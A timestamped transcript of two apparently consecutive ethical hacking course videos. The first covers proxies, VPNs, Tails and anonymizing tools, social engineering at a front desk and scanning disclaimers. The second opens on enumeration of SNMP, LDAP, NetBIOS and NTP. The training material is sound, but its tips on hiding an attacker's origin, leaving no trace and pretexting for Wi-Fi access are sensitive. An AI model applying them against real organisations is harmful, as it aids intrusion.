it even more basic, right?\n\n700\n00:31:49.783 --> 00:31:51.941\nBecause we want to just make sure\nthat you're comfortable with\n\n701\n00:31:51.941 --> 00:31:52.761\nthe general concepts.\n\n702\n00:31:52.761 --> 00:31:57.275\nWhat a VPN does is create a dedicated\npoint to point encrypted connection that\n\n703\n00:31:57.275 --> 00:32:01.513\nallows you to essentially exchange\ninformation securely Encrypting,\n\n704\n00:32:01.513 --> 00:32:03.190\nas Mike said, the traffic.\n\n705\n00:32:03.190 --> 00:32:05.830\nBut the main goal there\nis confidentiality and\n\n706\n00:32:05.830 --> 00:32:10.367\nprotection of the information being\nexchanged with dedicated known endpoints\n\n707\n00:32:10.367 --> 00:32:14.200\nand the ability then to operate\ninside that tunnel securely.\n\n708\n00:32:14.200 --> 00:32:17.850\nWe're not anonymizing,\nwe are not stripping out the IP addresses.\n\n709\n00:32:17.850 --> 00:32:20.160\nWe're not trying to hide\nwhere we're coming from or\n\n710\n00:32:20.160 --> 00:32:22.170\nwhere we're going to, that's all there.\n\n711\n00:32:22.170 --> 00:32:26.270\nWe're just doing it securely inside\na tunnel, essentially hidden from view.\n\n712\n00:32:26.270 --> 00:32:28.170\nWhereas, a proxy has\nnothing to do with that.\n\n713\n00:32:28.170 --> 00:32:31.960\nWe're not encrypting, we're not trying\nto do anything with regards to hiding\n\n714\n00:32:31.960 --> 00:32:35.690\nthe actual traffic and\nconfidentially protecting the traffic.\n\n715\n00:32:35.690 --> 00:32:39.410\nWe do want to hide something, but\nwhat we're hiding is our source, right?\n\n716\n00:32:39.410 --> 00:32:42.266\nWe're hiding where we're coming from,\nthat's what a proxy does, it NATs,\n\n717\n00:32:42.266 --> 00:32:43.220\nessentially.\n\n718\n00:32:43.220 --> 00:32:44.690\nIt address translates and\n\n719\n00:32:44.690 --> 00:32:49.060\nessentially prevents you from\nseeing what that primary source\n\n720\n00:32:49.060 --> 00:32:53.570\ndestination mapping looks like, because\nwe don't really have the actual source.\n\n721\n00:32:53.570 --> 00:32:58.710\nWe have a proxy, or\na elected representative that,\n\n722\n00:32:58.710 --> 00:33:01.410\non our behalf,\nis actually acting in that way.\n\n723\n00:33:01.410 --> 00:33:05.710\nAnd when we then daisy chain those\nproxies together, we're anonymizing and\n\n724\n00:33:05.710 --> 00:33:08.300\nthen rolling that anonymous\nconnection forward.\n\n725\n00:33:08.300 --> 00:33:12.130\nWhat you see at the end of that chain\nis the IP address of the last outbound\n\n726\n00:33:12.130 --> 00:33:13.270\nproxy connection,\n\n727\n00:33:13.270 --> 00:33:17.460\nnot the 12 other connections sitting\nbehind it wrapped up inside that traffic.\n\n728\n00:33:17.460 --> 00:33:19.670\nSo it becomes very difficult for\nus to unwind that and\n\n729\n00:33:19.670 --> 00:33:21.530\nsee what that looks like going backwards.\n\n730\n00:33:21.530 --> 00:33:25.990\nThis is why daisy chaining proxies\nbecomes a great tool for the bad actor.\n\n731\n00:33:25.990 --> 00:33:28.611\nBecause they can hide where they're\ncoming from and it's very difficult for\n\n732\n00:33:28.611 --> 00:33:29.749\nus to understand where they are.\n\n733\n00:33:29.749 --> 00:33:33.720\nThere's also another interesting\nphenomenon that goes on here with live\n\n734\n00:33:33.720 --> 00:33:37.947\nboot operating systems that could be used\nto circumvent these kind of security\n\n735\n00:33:37.947 --> 00:33:42.740\nprotections, and looking at hiding where\nwe're coming from or what we're doing.\n\n736\n00:33:42.740 --> 00:33:45.950\nBecause we may want to get around\ncensorship tools as I talked about\n\n737\n00:33:45.950 --> 00:33:47.310\npotentially in other things.\n\n738\n00:33:47.310 --> 00:33:51.270\nSo Tails is one of the live operating\nsystems that allows us to do this,\n\n739\n00:33:51.270 --> 00:33:54.340\nas in I have a tail,\nT-A-I-L-S, Tails, right?\n\n740\n00:33:54.340 --> 00:33:58.700\nSo tails is a live OS that you\ncan boot from a DVD, a USB stick.\n\n741\n00:33:58.700 --> 00:34:02.138\nIt's kinda like running one of the earlier\nversions of Linux like KNOPPIX,\n\n742\n00:34:02.138 --> 00:34:04.084\nright on a CD and\nbooting it up in real time.\n\n743\n00:34:04.084 --> 00:34:07.130\nYou can run it off an SD card,\nit's very portable, very small.\n\n744\n00:34:07.130 --> 00:34:10.900\nBut it loads up and essentially\nleaves no trace on the computer,\n\n745\n00:34:10.900 --> 00:34:12.000\nwhich is great, right?\n\n746\n00:34:12.000 --> 00:34:13.310\nSo it's gonna be very cool.\n\n747\n00:34:13.310 --> 00:34:15.905\nState of the art cryptographic tools and\nencryption techniques,\n\n748\n00:34:15.905 --> 00:34:19.330\neverything's sent and received,\njust transmitted, in encrypted form.\n\n749\n00:34:19.330 --> 00:34:20.530\nSecure browser,\n\n750\n00:34:20.530 --> 00:34:23.730\neverything is secure, really cool\noperating system to use, right?\n\n751\n00:34:23.730 --> 00:34:25.590\nAgain, if you're getting up to no good,\n\n752\n00:34:25.590 --> 00:34:27.650\ngreat way to do that\nfrom any system anywhere.\n\n753\n00:34:27.650 --> 00:34:30.330\nIf you wanna hide what you're doing for\nlegitimate reasons\n\n754\n00:34:30.330 --> 00:34:33.260\nbecause of censorship concerns,\nthings like that, again, very easy.\n\n755\n00:34:33.260 --> 00:34:36.590\nYou unplug, you walk away, no evidence\nof you having been there, right?\n\n756\n00:34:36.590 --> 00:34:38.410\nIt's like the Tor browser,\nyou can load that and\n\n757\n00:34:38.410 --> 00:34:41.670\nuse that securely from off of\nan external drive as well.\n\n758\n00:34:41.670 --> 00:34:44.370\nSo these kinda systems exist and\nthey should not be overlooked.\n\n759\n00:34:45.540 --> 00:34:48.850\nWhat the bad actor will often do\nis take an existing system and\n\n760\n00:34:48.850 --> 00:34:51.320\nsimply boot to something like Tails.\n\n761\n00:34:51.320 --> 00:34:54.350\nRun the attack through that and\nthen walk away, and\n\n762\n00:34:54.350 --> 00:34:56.530\nyou'll never leave any trace\nbehind of what they're doing.\n\n763\n00:34:56.530 --> 00:34:58.536\nSo that also maybe something to do.\n\n764\n00:34:58.536 --> 00:35:02.000\nWe may wanna anonymize by using\nthings that will eradicate cookies.\n\n765\n00:35:02.000 --> 00:35:05.396\nThere's tools out there,\nlike G-Zapper, that'll go through and\n\n766\n00:35:05.396 --> 00:35:07.630\nzap all the cookies,\nget rid of everything.\n\n767\n00:35:07.630 --> 00:35:11.030\nWe can flush the cache on the browsers,\nof course, and do stuff like that.\n\n768\n00:35:11.030 --> 00:35:13.660\nBut there's a bunch of these tools\nthat will that anonymize and\n\n769\n00:35:13.660 --> 00:35:18.085\nessentially remove access, or\ninformation to access, in our systems.\n\n770\n00:35:18.085 --> 00:35:21.536\nThere's all sorts of stuff we can do,\nyou can use anonymizing browsers,\n\n771\n00:35:21.536 --> 00:35:23.328\nuse anonymizing operating systems.\n\n772\n00:35:23.328 --> 00:35:25.551\nAnd all that kind of stuff\nwill be helpful, but\n\n773\n00:35:25.551 --> 00:35:27.180\nwe just wanna think about that.\n\n774\n00:35:27.180 --> 00:35:30.414\nThere are these systems, again,\non the mobile platforms as well.\n\n775\n00:35:30.414 --> 00:35:35.665\nOpenDoor, Orbot O-R-B-O-T, Psiphon\nP-S-I-P-H-O-N, are all tools that may\n\n776\n00:35:35.665 --> 00:35:40.431\nexist that can be downloaded for a variety\nof different mobile platforms and may be\n\n777\n00:35:40.431 --> 00:35:45.712\nused to do the same thing essentially,\nanonymize but on the mobile platform.\n\n778\n00:35:45.712 --> 00:35:48.788\nAnd think about it, you don't have to go\nout and use everyone of these tools but\n\n779\n00:35:48.788 --> 00:35:51.769\nyou wanna at least be aware of the fact\nthat somebody could be doing this right\n\n780\n00:35:51.769 --> 00:35:52.852\nfrom their mobile device.\n\n781\n00:35:52.852 --> 00:35:56.150\nI have tools I run on my BlackBerry\nthat I can do some of this stuff with.\n\n782\n00:35:56.150 --> 00:35:58.844\nI have tools that I can run\non other handheld devices.\n\n783\n00:35:58.844 --> 00:36:02.531\nI have them on my mobile tablet,\nmy Windows tablet, that I can sit and just\n\n784\n00:36:02.531 --> 00:36:06.709\nsit in the lobby of your business, waiting\non you to come and have a meeting with me.\n\n785\n00:36:06.709 --> 00:36:08.442\n>> [LAUGH]\n>> And I can connect to your wireless\n\n786\n00:36:08.442 --> 00:36:11.510\nnetwork if you're foolish\nenough to leave one open.\n\n787\n00:36:11.510 --> 00:36:13.980\nAnd I can run these tools and\nprofile your network,\n\n788\n00:36:13.980 --> 00:36:17.390\nwhile I'm sitting there under the guise\nof supposedly meeting with somebody.\n\n789\n00:36:17.390 --> 00:36:19.520\nAnd you don't tend to pay attention\nto many people that walk in and\n\n790\n00:36:19.520 --> 00:36:20.570\ndo that, right?\n\n791\n00:36:20.570 --> 00:36:22.020\nI have a meeting with so and so, okay.\n\n792\n00:36:22.020 --> 00:36:24.931\nAnd I may legitimately have\na meeting with them, but I may not.\n\n793\n00:36:24.931 --> 00:36:27.474\nBut if I'm sitting there, I can profile,\n\n794\n00:36:27.474 --> 00:36:31.440\nif I can get into a network that is\nconnected to the corporate side.\n\n795\n00:36:31.440 --> 00:36:34.250\nIf you have wireless networks that\nare air gapped and just dedicated for\n\n796\n00:36:34.250 --> 00:36:35.670\nguest access, okay.\n\n797\n00:36:35.670 --> 00:36:39.594\nBut I've been to many customers that leave\nwireless open on the corporate network.\n\n798\n00:36:39.594 --> 00:36:42.960\nThat's just the best thing in the world,\nbecause essentially at that point,\n\n799\n00:36:42.960 --> 00:36:46.290\nI can run these tools stealthily while I'm\nsitting there, and you may never know.\n\n800\n00:36:46.290 --> 00:36:48.800\nAnd I don't even have\nto bother to hack in,\n\n801\n00:36:48.800 --> 00:36:51.190\nI've essentially been given\nan open door invitation.\n\n802\n00:36:51.190 --> 00:36:54.970\nIf your wireless is powerful enough,\nI could sit out in the parking lot, right?\n\n803\n00:36:54.970 --> 00:36:57.460\n>> Yeah, your social engineer,\nthe person at the front desk, hey,\n\n804\n00:36:57.460 --> 00:36:59.390\nI've got 30 minutes before my meeting.\n\n805\n00:36:59.390 --> 00:37:00.480\nCan I get the Wi-Fi password?\n\n806\n00:37:00.480 --> 00:37:02.070\nI gotta get some work done.\n\n807\n00:37:02.070 --> 00:37:03.658\nOdds are, half the time\nthey're gonna give it to you.\n\n808\n00:37:03.658 --> 00:37:05.150\n>> Yeah, who's gonna say no to you, right?\n\n809\n00:37:05.150 --> 00:37:07.664\nIf you're dressed up,\nyou look like you're there for business.\n\n810\n00:37:07.664 --> 00:37:11.127\nI look a little scruffy and I am,\npeople will tell you that know me, right?\n\n811\n00:37:11.127 --> 00:37:12.950\nI was in the music business for\na long time.\n\n812\n00:37:12.950 --> 00:37:14.870\nYou can tell that by looking at me, right?\n\n813\n00:37:14.870 --> 00:37:17.982\nI got hair down to, well you can see,\npretty far down my back.\n\n814\n00:37:17.982 --> 00:37:20.189\n>> [LAUGH]\n>> But the reality is, when I clean up,\n\n815\n00:37:20.189 --> 00:37:24.136\nI shave and I look, well I don't shave\nfully cuz the beard hasn't gone away in\n\n816\n00:37:24.136 --> 00:37:26.672\nover 30 years, but\nwhen I trim, I should say.\n\n817\n00:37:26.672 --> 00:37:29.840\nBut yeah, when I put on a suit and\ntie I clean up pretty nicely.\n\n818\n00:37:29.840 --> 00:37:32.680\nAnd you look at me and\nI look like any corporate citizen\n\n819\n00:37:32.680 --> 00:37:35.950\nanywhere that you would be doing business\nwith, especially in the field that I'm in.\n\n820\n00:37:35.950 --> 00:37:38.152\nHalf the people that do\nwhat I do look like me.\n\n821\n00:37:38.152 --> 00:37:41.030\nI actually don't stand out in my world,\nright?\n\n822\n00:37:41.030 --> 00:37:44.256\nSo the reality is,\nyou just gotta act the part.\n\n823\n00:37:44.256 --> 00:37:47.037\nAnd if you act the part from\na social engineering perspective,\n\n824\n00:37:47.037 --> 00:37:50.446\nmore often than not if you sound like\nyou belong and you sound authoritative,\n\n825\n00:37:50.446 --> 00:37:53.933\npeople are very apt to just say okay,\nyeah, that’s what you’re there to do.\n\n826\n00:37:53.933 --> 00:37:58.750\nIt sounds good, let’s give you what you\nneed, and that’s sometimes all it takes.\n\n827\n00:37:58.750 --> 00:38:02.540\nAnd that, in and of itself, from a CH\nperspective is something to consider.\n\n828\n00:38:02.540 --> 00:38:04.907\nWe haven’t really focused on\nsocial engineering very much,\n\n829\n00:38:04.907 --> 00:38:06.600\nwe'll talk about it in upcoming episodes.\n\n830\n00:38:06.600 --> 00:38:10.970\nBut it may not be any harder than just\nsimply politely asking if you could just\n\n831\n00:38:10.970 --> 00:38:14.680\nhave that IP address, or\nhave that wireless access point and\n\n832\n00:38:14.680 --> 00:38:15.995\ngive everybody access to it.\n\n833\n00:38:15.995 --> 00:38:16.620\n>> Yeah.\n\n834\n00:38:16.620 --> 00:38:20.110\n>> I fight my network admins in\nthe centers all the time about this,\n\n835\n00:38:20.110 --> 00:38:21.838\ncuz we have guest access for the students.\n\n836\n00:38:21.838 --> 00:38:22.351\n>> Right.\nAnd\n\n837\n00:38:22.351 --> 00:38:25.343\nfrom the very beginning I made it very\nclear to them, when I set the networks\n\n838\n00:38:25.343 --> 00:38:28.448\nup and I was running them, cuz I don't\nreally manage them directly anymore.\n\n839\n00:38:28.448 --> 00:38:31.790\nWe have people to do that now,\nbut for years I did that.\n\n840\n00:38:31.790 --> 00:38:35.220\nAnd when I set them up, physically\ntotally different systems, air gap,\n\n841\n00:38:35.220 --> 00:38:36.165\nthe whole nine yards.\n\n842\n00:38:36.165 --> 00:38:37.040\n>> Mm-hm.\n>> Then at one point,\n\n843\n00:38:37.040 --> 00:38:40.230\nsomebody took them over, and like no\nwe just need one set of common stuff.\n\n844\n00:38:40.230 --> 00:38:43.230\nLet's put the admin,\ntesting which is a huge no-no, and\n\n845\n00:38:43.230 --> 00:38:46.340\neverything all together in one place,\nand I said absolutely not.\n\n846\n00:38:46.340 --> 00:38:47.960\nWe can not do that, right?\n\n847\n00:38:47.960 --> 00:38:50.370\nBecause that's just\nan accident waiting to happen.\n\n848\n00:38:50.370 --> 00:38:51.354\nWe teach hacking classes.\n\n849\n00:38:51.354 --> 00:38:52.881\n>> [LAUGH]\n>> What are you gonna do when some\n\n850\n00:38:52.881 --> 00:38:55.620\nstudent gets the bright idea\nof hacking into that network,\n\n851\n00:38:55.620 --> 00:38:57.930\nwhich I promise you is gonna happen,\nright?\n\n852\n00:38:57.930 --> 00:39:00.072\nBecause I'm gonna tell them to.\n\n853\n00:39:00.072 --> 00:39:00.972\n>> [LAUGH]\n>> So\n\n854\n00:39:00.972 --> 00:39:05.231\nthat's what you've gotta look out for, is\nthe people that just trip across the stuff\n\n855\n00:39:05.231 --> 00:39:08.500\nthat you're doing that may not\nmake sense to the average person.\n\n856\n00:39:08.500 --> 00:39:10.813\nBut somebody there is gonna find it,\nright?\n\n857\n00:39:10.813 --> 00:39:14.613\nI mean, the best thing you can do from a\ncountermeasure perspective is encrypt all\n\n858\n00:39:14.613 --> 00:39:18.413\ntraffic on the internal LAN, and make\nsure that you're VLANing everything, and\n\n859\n00:39:18.413 --> 00:39:20.139\nthat you are filtering everything.\n\n860\n00:39:20.139 --> 00:39:21.899\nBut the reality is, the urban myth and\n\n861\n00:39:21.899 --> 00:39:25.529\nlegend around slowing down traffic to\nthe point that it doesn't work prevents\n\n862\n00:39:25.529 --> 00:39:29.470\nus from doing that, when in fact it\ndoesn't really impact traffic that much.\n\n863\n00:39:29.470 --> 00:39:31.250\nBut there's a lot of\nadditional overhead and\n\n864\n00:39:31.250 --> 00:39:35.290\ncomplexity involved with building an\nenterprise architecture that encrypts all\n\n865\n00:39:35.290 --> 00:39:40.130\ntraffic, that uses VLANs to logically\nsegment traffic flow, and that does port\n\n866\n00:39:40.130 --> 00:39:44.230\nmapping to allow you to understand how to\ncontrol physical access to the network.\n\n867\n00:39:44.230 --> 00:39:46.762\nIt can be done, but\nit takes additional time and resources.\n\n868\n00:39:46.762 --> 00:39:50.486\nThese are the kinda things you want to\nthink about with regards to network\n\n869\n00:39:50.486 --> 00:39:51.130\nscanning.\n\n870\n00:39:51.130 --> 00:39:54.150\n>> All right, very good, and probably\none other thing I think, I know you've,\n\n871\n00:39:54.150 --> 00:39:56.980\na couple time,\nthrown in some disclaimers here.\n\n872\n00:39:56.980 --> 00:39:58.530\nI probably want to throw one more in here.\n\n873\n00:39:58.530 --> 00:40:00.900\nI think we have already but\njust to make sure you guys remember.\n\n874\n00:40:00.900 --> 00:40:03.759\nYou get some of these tools,\nthey're all free to download, right?\n\n875\n00:40:03.759 --> 00:40:06.595\nYou're sitting at work,\nyou download one of these Scanners,\n\n876\n00:40:06.595 --> 00:40:08.851\nyou're tempted to run them\non your work network?\n\n877\n00:40:08.851 --> 00:40:12.453\nBe careful with that, you could definitely\nbe violating your acceptable use policy\n\n878\n00:40:12.453 --> 00:40:16.000\nand get in a lot of trouble by running\nsome of these tools on your work network.\n\n879\n00:40:16.000 --> 00:40:17.744\nEven when you get out there at home and\n\n880\n00:40:17.744 --> 00:40:19.944\nyou start scanning public\nIP address ranges.\n\n881\n00:40:19.944 --> 00:40:25.082\nWe've talked, it's not necessarily illegal\nto run these scans, but if you scan\n\n882\n00:40:25.082 --> 00:40:29.940\nthe wrong ranges you might get the black\nvan pulling up in front of your house.\n\n883\n00:40:29.940 --> 00:40:33.950\nYou might get your ISP sending\nyou a cease and desist, so\n\n884\n00:40:33.950 --> 00:40:35.780\ndo be careful with that kind of thing.\n\n885\n00:40:35.780 --> 00:40:38.520\n>> Yeah, and it's a very good point,\nlet me just add one thing.\n\n886\n00:40:40.280 --> 00:40:41.901\nAnd just to be clear and\nbe very transparent,\n\n887\n00:40:41.901 --> 00:40:43.871\nand we joke around about on\na lot of stuff here, right?\n\n888\n00:40:43.871 --> 00:40:47.518\nWe try to keep a lighthearted cuz you\nwanna have fun while you're learning, but\n\n889\n00:40:47.518 --> 00:40:49.185\nwe'll put on our serious face now.\n\n890\n00:40:49.185 --> 00:40:50.377\nOkay, very serious.\n\n891\n00:40:50.377 --> 00:40:53.684\nSo we wanna be serious about one thing,\nand Mike made it very clear but\n\n892\n00:40:53.684 --> 00:40:55.540\nlet me add something to this.\n\n893\n00:40:55.540 --> 00:40:59.350\nWhen you are using these tools\non your corporate network,\n\n894\n00:40:59.350 --> 00:41:01.550\nyou must seek permission to use them.\n\n895\n00:41:01.550 --> 00:41:03.810\nYou, as we've talked about before and\nmade very clear,\n\n896\n00:41:03.810 --> 00:41:06.690\nhave to have senior management buy-in\nto do any of this kind of work.\n\n897\n00:41:06.690 --> 00:41:09.465\nEven if you are just trying them out to\nsee what they can do because you think\n\n898\n00:41:09.465 --> 00:41:12.090\nthey'll be valuable, you must go\nask somebody and make sure that\n\n899\n00:41:12.090 --> 00:41:15.580\nthey okay it because you can easily,\nif you are not paying attention, take down\n\n900\n00:41:15.580 --> 00:41:19.750\na production network and cause tremendous\ndamage without meaning to, number one.\n\n901\n00:41:19.750 --> 00:41:22.209\nNumber two,\nif you use these tools on a home network.\n\n902\n00:41:23.220 --> 00:41:26.850\nWhat you do at home is up to you as\nlong as you don't cross the threshold\n\n903\n00:41:26.850 --> 00:41:30.580\nof the external side of your router\nto go out to the rest of the world.\n\n904\n00:41:30.580 --> 00:41:35.302\nThe minute you scan across that routing\ndevice, your cable modem, whatever it is,\n\n905\n00:41:35.302 --> 00:41:39.230\nand you go out on the ISP's network,\nyou are on their network.\n\n906\n00:41:39.230 --> 00:41:40.180\nThey own it.\n\n907\n00:41:40.180 --> 00:41:43.980\nThey get to set the rules of\nengagement and what is acceptable use.\n\n908\n00:41:43.980 --> 00:41:49.240\nMike made the point that you may very well\nwind up with a cease and desist problem.\n\n909\n00:41:49.240 --> 00:41:53.870\nI can guarantee you unequivocally\nthat if you use some of these tools,\n\n910\n00:41:53.870 --> 00:41:55.220\nyou will be flagged.\n\n911\n00:41:55.220 --> 00:42:00.270\nAnd you have to understand that if you get\nflagged and you get on that blacklist for\n\n912\n00:42:00.270 --> 00:42:04.350\npeople that are doing things innocently,\nthough you are getting up\n\n913\n00:42:04.350 --> 00:42:07.160\nto potentially no good, they may just\ndecide to cut off your access and\n\n914\n00:42:07.160 --> 00:42:08.890\nsay sorry,\nwe don't want you as a customer.\n\n915\n00:42:08.890 --> 00:42:10.250\nAnd you may have nothing to say about it,\n\n916\n00:42:10.250 --> 00:42:13.770\nso you gotta be very careful\nwith this kinda stuff.\n\n917\n00:42:13.770 --> 00:42:16.700\nI'm not suggesting you shouldn't\ntry to figure out how to do it.\n\n918\n00:42:16.700 --> 00:42:20.060\nVirtualization today gives you\na great opportunity to build networks.\n\n919\n00:42:20.060 --> 00:42:24.160\nYou've seen us use lab environments here\nthat are setup certain ways that we take\n\n920\n00:42:24.160 --> 00:42:27.140\nprotections with,\nthat we know we can use safely, but\n\n921\n00:42:27.140 --> 00:42:30.270\nthat we are using to demo and\ntest these tools for you.\n\n922\n00:42:30.270 --> 00:42:31.550\nAnd it doesn't take very much.\n\n923\n00:42:31.550 --> 00:42:34.900\nYou just have to build three or four\nvirtual machines and then set them up and\n\n924\n00:42:34.900 --> 00:42:36.770\nnetwork them so you can run these tools.\n\n925\n00:42:36.770 --> 00:42:39.070\nAnd what we do is we did\ndemonstrations for you.\n\n926\n00:42:39.070 --> 00:42:42.590\nSome are done live, things that we know\nare not get us into any kind of trouble\n\n927\n00:42:42.590 --> 00:42:46.385\nand cause any concern at all, like going\nout to Netcraft and profiling a website,\n\n928\n00:42:46.385 --> 00:42:48.585\nwe'll ask Mike to do live and\nwe make Mike do it so\n\n929\n00:42:48.585 --> 00:42:50.360\nthat if anybody comes to look-\n>> [LAUGH]\n\n930\n00:42:50.360 --> 00:42:51.440\n>> It's not me.\n\n931\n00:42:51.440 --> 00:42:52.010\nWe're very clear.\n\n932\n00:42:52.010 --> 00:42:53.340\n>> Thank you that.\n>> Upfront, in the street.\n\n933\n00:42:53.340 --> 00:42:57.430\nWe say Mike, please do that before Mike\ndoes it, so if I have testify later,\n\n934\n00:42:57.430 --> 00:42:58.790\nI can always say Mike did.\n\n935\n00:42:58.790 --> 00:43:03.560\nBut, the reality is we do the things that\nwe know we could do safely live as demos\n\n936\n00:43:03.560 --> 00:43:07.170\nfor you in real time on the web here, but\nthen the things that we know we can do\n\n937\n00:43:07.170 --> 00:43:10.850\nsafely but may present a challenge\nare done in the lab environment so\n\n938\n00:43:10.850 --> 00:43:14.590\nif they do get out of hand for\nsome reason, we can easily control them.\n\n939\n00:43:14.590 --> 00:43:17.810\nAnd you've gotta be smart and you've\ngotta be thinking about how to do this\n\n940\n00:43:17.810 --> 00:43:20.235\nstuff in a way that will not cause harm.\n\n941\n00:43:20.235 --> 00:43:23.050\nDue care and due diligence\nare the watch words and bywords for\n\n942\n00:43:23.050 --> 00:43:24.430\nevery security professional.\n\n943\n00:43:24.430 --> 00:43:26.420\nIt's very important for\nyou to remember that.\n\n944\n00:43:26.420 --> 00:43:27.190\n>> All right, Adam.\n\n945\n00:43:27.190 --> 00:43:28.770\nAgain another great looking at scanning.\n\n946\n00:43:28.770 --> 00:43:32.514\nWe got to see some of that in action and\ngone through a whole bunch of different\n\n947\n00:43:32.514 --> 00:43:34.679\ntools that we can use\nto perform scamming and\n\n948\n00:43:34.679 --> 00:43:35.398\nwell-\n>> Scamming?\n\n949\n00:43:35.398 --> 00:43:36.078\n>> Scamming?\n>> Scamming?\n\n950\n00:43:36.078 --> 00:43:37.710\nWhat?\nSay what?\n\n951\n00:43:37.710 --> 00:43:38.650\n>> Not you guys.\n\n952\n00:43:38.650 --> 00:43:40.465\nBut-\n>> Insert credit card here, please.\n\n953\n00:43:40.465 --> 00:43:44.090\n>> [LAUGH] Doing the scanning,\ngoing through proxies, right?\n\n954\n00:43:44.090 --> 00:43:45.810\nWe talked about the difference\nbetween proxy and\n\n955\n00:43:45.810 --> 00:43:47.080\nVPN, it's a lot of great stuff there.\n\n956\n00:43:47.080 --> 00:43:48.830\nHope everybody enjoyed watching.\n\n957\n00:43:48.830 --> 00:43:52.740\nI'm gonna proxy myself as we go out after\nthat little thing from Adam pointing\n\n958\n00:43:52.740 --> 00:43:53.724\neverything back to me so-\n>> [LAUGH]\n\n959\n00:43:53.724 --> 00:43:55.408\n>> I've been your host Don Pezet.\n\n960\n00:43:55.408 --> 00:43:58.549\n[LAUGH]\n>> And I'm Tim Jones.\n\n961\n00:43:58.549 --> 00:44:00.222\n[LAUGH]\n>> And we'll see you next time.\n\n962\n00:44:00.222 --> 00:44:01.167\n>> Take care everybody.\n\n",

00:00:16.698\nI'm your host Mike Roderick.\n\n4\n00:00:16.698 --> 00:00:19.070\nAnd today we're doing CEH Version 9.\n\n5\n00:00:19.070 --> 00:00:21.010\nAnd specifically in this episode,\n\n6\n00:00:21.010 --> 00:00:26.900\nwe're going into phase three of our attack\nlife cycle, the enumeration phase, right?\n\n7\n00:00:26.900 --> 00:00:30.880\nWe've already learned about foot printing,\nreconnaissance, scanning.\n\n8\n00:00:30.880 --> 00:00:34.190\nNow we're going to start enumerating or\nlisting things out.\n\n9\n00:00:34.190 --> 00:00:36.040\nAnd here to help us with that is Mr.\nAdam Gordon.\n\n10\n00:00:36.040 --> 00:00:37.090\nHow you doing, Adam?\n\n11\n00:00:37.090 --> 00:00:38.240\n>> I'm doing well, I'm doing well.\n\n12\n00:00:38.240 --> 00:00:39.570\nEnumeration.\n\n13\n00:00:39.570 --> 00:00:43.525\nI'm just too excited for words, so\nI will list them one at a time instead.\n\n14\n00:00:43.525 --> 00:00:46.730\n>> [LAUGH]\n>> So let's talk about enumeration.\n\n15\n00:00:46.730 --> 00:00:48.910\nSo as Mike said,\nenumeration is about listing things.\n\n16\n00:00:48.910 --> 00:00:51.730\nAnd listing is a good\nthing to think about doing\n\n17\n00:00:51.730 --> 00:00:54.000\nwhen we are looking to profile a system.\n\n18\n00:00:54.000 --> 00:00:57.580\nWhen we have done the footprinting,\nthe recon, the scanning,\n\n19\n00:00:57.580 --> 00:01:00.720\nwe now have to start examining\nwhat we have and categorizing and\n\n20\n00:01:00.720 --> 00:01:05.050\nputting together, and figuring out what\nkind of information we may be able to use.\n\n21\n00:01:05.050 --> 00:01:07.020\nBad actors are obviously\ngoing to do the same thing,\n\n22\n00:01:07.020 --> 00:01:08.810\ntrying to figure out\nwhere the weaknesses are.\n\n23\n00:01:08.810 --> 00:01:11.530\nWe have to do the same thing from the\nperspective of trying to plug the holes\n\n24\n00:01:11.530 --> 00:01:12.840\nbefore they get there.\n\n25\n00:01:12.840 --> 00:01:16.750\nSo when we think about general enumeration\nwe're thinking about understanding\n\n26\n00:01:16.750 --> 00:01:18.140\nwhat may be running in a system.\n\n27\n00:01:18.140 --> 00:01:22.240\nServices, ports that are available,\napplications that are there,\n\n28\n00:01:22.240 --> 00:01:24.920\nthings of that nature will\nobviously be very important.\n\n29\n00:01:24.920 --> 00:01:26.370\nCan we enumerate user accounts?\n\n30\n00:01:26.370 --> 00:01:27.170\nCan we find them?\n\n31\n00:01:28.300 --> 00:01:29.720\nDrill down and get them.\n\n32\n00:01:29.720 --> 00:01:32.930\nWe'll take a look at some cool tools\nhere as we do a demo later on.\n\n33\n00:01:32.930 --> 00:01:36.890\nI think I mentioned this in the intro\nepisodes, Hyena, some of the other tools\n\n34\n00:01:36.890 --> 00:01:41.870\nthat allow us to go in and create users on\nthe fly for instance in an LDAP system.\n\n35\n00:01:41.870 --> 00:01:45.940\nCan we dump the information out of\nthe LDAP directory, find out what's there?\n\n36\n00:01:45.940 --> 00:01:49.770\nCan we enumerate SNMP and look at\nSimple Network Management Protocol and\n\n37\n00:01:49.770 --> 00:01:51.220\nfind out what may be running?\n\n38\n00:01:51.220 --> 00:01:53.460\nWhat kind of community\nstrings are being used.\n\n39\n00:01:53.460 --> 00:01:56.020\nPeople often overlook SNMP and\ntake it for granted.\n\n40\n00:01:56.020 --> 00:01:59.220\nWe’re running it, yeah we use it to\nremotely control and connect and\n\n41\n00:01:59.220 --> 00:02:01.170\ndiagnose stuff and see what's out there.\n\n42\n00:02:01.170 --> 00:02:04.710\nBut we use community string public or\nprivate the default ones.\n\n43\n00:02:04.710 --> 00:02:06.770\nGood for you by the way, right?\n\n44\n00:02:06.770 --> 00:02:07.920\nGood for the bad actors as well.\n\n45\n00:02:07.920 --> 00:02:09.580\n>> Good for the bad actors as well.\n\n46\n00:02:09.580 --> 00:02:10.120\nRight, so.\n>> [LAUGH]\n\n47\n00:02:10.120 --> 00:02:11.550\n>> You know, as a result,\n\n48\n00:02:11.550 --> 00:02:12.979\nwhy make things hard for the bad people?\n\n49\n00:02:12.979 --> 00:02:14.430\n>> [LAUGH]\n>> You just piss them off even more and\n\n50\n00:02:14.430 --> 00:02:15.546\nthey wanna hurt you even more.\n\n51\n00:02:15.546 --> 00:02:16.840\n>> [LAUGH]\n>> So, here Mr.\n\n52\n00:02:16.840 --> 00:02:19.630\nnice person, take everything,\nit's all yours, take it all, right?\n\n53\n00:02:19.630 --> 00:02:24.980\nSo we want to make sure that we want to\ngo ahead, and we want to change that up.\n\n54\n00:02:24.980 --> 00:02:27.590\nBut we got to look at what\nSNMP traffic we may find.\n\n55\n00:02:27.590 --> 00:02:28.700\nLook at NetBios.\n\n56\n00:02:28.700 --> 00:02:29.630\nWant to look at NTP.\n\n57\n00:02:29.630 --> 00:02:31.070\nWhat about network time protocol?\n\n58\n00:02:31.070 --> 00:02:32.310\nWhat can we tell from that?\n\n59\n00:02:32.310 --> 00:02:33.240\nQuite a bit, actually.\n\n60\n00:02:33.240 --> 00:02:38.140\nIf we can execute a DOS attack against the\nsystem by decoupling time synchronization.\n\n61\n00:02:38.140 --> 00:02:39.820\nWe can knock everything offline.\n\n62\n00:02:39.820 --> 00:02:43.140\nWe may be able to stop you from\nauthenticating into your LDAP 